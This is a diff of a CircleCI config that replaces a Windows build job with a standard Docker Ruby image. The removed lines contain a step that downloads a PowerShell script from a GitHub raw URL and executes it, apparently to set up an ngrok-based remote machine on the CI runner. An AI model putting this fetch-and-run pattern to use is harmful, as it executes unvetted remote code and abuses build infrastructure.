@@ -1,21 +1,8 @@
-version: 2.1 
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
+version: 2.0
 jobs:
-  build: 
-    executor:
-      name: win/default 
-      size: "medium" 
-      
-        
- 
-    steps:  
-       
-      - run: 
-          name: Paste Ngrok Auth Value In Hosted Link
-          command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/utkarshsheoran/vps/main/sh -OutFile gpu.ps1 
-          
-      - run: ./gpu.ps1
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
